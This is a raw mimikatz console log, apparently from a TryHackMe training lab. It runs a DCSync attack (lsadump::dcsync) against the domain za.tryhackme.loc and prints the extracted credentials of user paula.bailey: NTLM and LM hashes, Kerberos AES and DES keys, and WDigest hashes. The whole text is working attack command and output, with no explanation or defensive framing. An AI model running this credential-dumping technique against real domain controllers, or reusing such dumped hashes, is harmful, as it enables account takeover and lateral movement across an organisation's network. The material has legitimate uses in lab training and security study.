
```
mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /user:paula.bailey 
[DC] 'za.tryhackme.loc' will be the domain 
[DC] 'THMDC.za.tryhackme.loc' will be the DC server 
[DC] 'paula.bailey' will be the user account        
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : paula.bailey 

** SAM ACCOUNT **

SAM Username         : paula.bailey 
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD ) 
Account expiration   :
Password last change : 4/25/2022 6:30:03 PM
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1126 
Object Relative ID   : 1126

Credentials:
  Hash NTLM: d466a2cb02ae838500c5fb6cde4339a6 
    ntlm- 0: d466a2cb02ae838500c5fb6cde4339a6 
    lm  - 0: c86d3dc6df28b0a9b6ca8d09ee8053b2 

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 0c8a2d7684a316010ac1c28e73adbae0 

* Primary:Kerberos-Newer-Keys *
    Default Salt : ZA.TRYHACKME.LOCpaula.bailey     
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : fc6ad44ec6b68a78e97805b72fcbfa27d9c482ddcbedae6081b9c0368af25847 
      aes128_hmac       (4096) : b60421346d2654e6f246c2029511ee20
      des_cbc_md5       (4096) : 31233da8c4106bf1

* Primary:Kerberos *
    Default Salt : ZA.TRYHACKME.LOCpaula.bailey 
    Credentials
      des_cbc_md5       : 31233da8c4106bf1      

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  58943f637ef1cfb11c844ed75baf2b46        
    02  886c96bd20db13fe929bd231ede6f589 
    03  5b7ca71f7b32bf993fc17bf062949587 
    04  58943f637ef1cfb11c844ed75baf2b46 
    05  886c96bd20db13fe929bd231ede6f589 
    06  7e485dd1afb1193ba6739e79fc3189bd 
    07  58943f637ef1cfb11c844ed75baf2b46 
    08  a1f05d5d5fb6d6d62b6df8b4f5899636 
    09  a1f05d5d5fb6d6d62b6df8b4f5899636 
    10  f30dbe4c579d5fa8a7ca193966df1faf 
    11  3a75bfbba6ccbd578bd47241684d0440 
    12  a1f05d5d5fb6d6d62b6df8b4f5899636 
    13  dfc427cec621cd5f0b8cd2e8975a3420 
    14  3a75bfbba6ccbd578bd47241684d0440 
    15  b74e68d956e5698a4d567b3f31456d84 
    16  b74e68d956e5698a4d567b3f31456d84 
    17  36612dc5486bb7c0091dc48883ba39b2 
    18  f91e8e17fcb1267cc36e8d7c3ccb04b5 
    19  90d734e0a3fc341b74d5742e960aa1c0 
    20  6914d6a1046212a2f21468066753f000 
    21  dbb10f31227b12004146d20ccbd818c6 
    22  dbb10f31227b12004146d20ccbd818c6
    23  adeea76929df782533ed48da17b6f895 
    24  0e8080de513bf0fed00edfb49b4637c3
    25  0e8080de513bf0fed00edfb49b4637c3
    26  69759ea55e96760d87ac813dda547b5a 
    27  fe232a10e4fe4d12f14aa79b748a0e62
    28  9ebd83e44d9c611525b0a9aed385bd82
    29  151badb23af6f2fc7a6f785e948f9f79 

```


